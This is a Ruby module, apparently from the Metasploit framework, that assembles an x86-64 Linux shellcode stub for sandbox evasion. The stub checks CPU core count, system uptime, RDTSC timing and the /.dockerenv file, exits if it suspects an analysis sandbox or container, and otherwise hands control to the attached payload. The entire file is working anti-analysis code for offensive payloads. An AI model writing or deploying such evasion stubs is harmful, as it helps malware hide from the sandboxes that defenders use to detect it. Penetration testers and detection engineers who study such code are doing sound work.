module Msf::Payload::Linux::X64::SandboxEvasion
  def sandbox_evasion(cores = 2, uptime = 600, check_docker = true, check_virt = false)

    rdtsc_asm = ""
    if check_virt
      rdtsc_asm = %Q^
; ─────────────────────────────────────────────────────────────
; Check: Execution Latency via RDTSC
; ─────────────────────────────────────────────────────────────
check_rdtsc:
    xor eax, eax
    cpuid
    rdtsc
    shl rdx, 32
    or rax, rdx
    mov r8, rax

    xor eax, eax
    cpuid

    rdtsc
    shl rdx, 32
    or rax, rdx
    
    sub rax, r8
    
    xor ebx, ebx
    mov bx, 0x3E8
    cmp rax, rbx
    jge sandbox_detected   ; EXIT IF CYCLES >= 1000
      ^
    end

    docker_asm = ""
    if check_docker
      docker_asm = %Q^
; ─────────────────────────────────────────────────────────────
; Check: Container Detection via /.dockerenv existence
; ─────────────────────────────────────────────────────────────
check_docker:
    xor eax, eax
    push rax
    mov rax, 0x766e6572656b636f
    push rax
    mov rax, 0x642e2f2f2f2f2f2f
    push rax

    xor eax, eax
    mov al, 21
    mov rdi, rsp
    xor rsi, rsi
    syscall

    test rax, rax
    js clean_docker
    jmp sandbox_detected   ; EXIT IF DOCKERENV EXISTS

clean_docker:
    pop rax
    pop rax
    pop rax
      ^
    end

    asm = %Q^
_start:
    xor eax, eax
    mov al, 128
    sub rsp, rax

; ─────────────────────────────────────────────────────────────
; Check: CPU cores via sched_getaffinity
; ─────────────────────────────────────────────────────────────
check_cores:
    xor eax, eax
    mov al, 204
    xor rdi, rdi
    xor rsi, rsi
    mov sil, 128
    mov rdx, rsp
    syscall
    
    test rax, rax
    js check_uptime
    
    mov rbx, [rsp]
    xor rcx, rcx
count_loop:
    test rbx, rbx
    jz evaluate_cores
    mov rax, rbx
    dec rax
    and rbx, rax
    inc rcx
    jmp count_loop

evaluate_cores:
    cmp rcx, #{cores}
    jl sandbox_detected

; ─────────────────────────────────────────────────────────────
; Check: System Uptime via sysinfo
; ─────────────────────────────────────────────────────────────
check_uptime:
    xor eax, eax
    mov al, 99
    mov rdi, rsp
    syscall
    
    test rax, rax
    js execute_optional_checks
    
    mov rax, [rsp]
    xor rbx, rbx
    mov bx, #{uptime}
    cmp rax, rbx
    jle sandbox_detected

execute_optional_checks:
#{rdtsc_asm}
#{docker_asm}

    jmp pass               ; ALL CHECKS PASSED, JUMP TO PAYLOAD

; ─────────────────────────────────────────────────────────────
; Sandbox Detected: Kill Process
; ─────────────────────────────────────────────────────────────
sandbox_detected:
    xor eax, eax
    mov al, 231
    xor edi, edi
    syscall

; ─────────────────────────────────────────────────────────────
; Clean Up & Execute
; ─────────────────────────────────────────────────────────────
pass:
    xor eax, eax
    mov al, 128
    add rsp, rax
    xor rax, rax
    xor rbx, rbx
    xor rcx, rcx
    xor rdx, rdx
    xor rdi, rdi
    xor rsi, rsi
    xor r8, r8
^
    Metasm::Shellcode.assemble(Metasm::X86_64.new, asm).encode_string
  end
end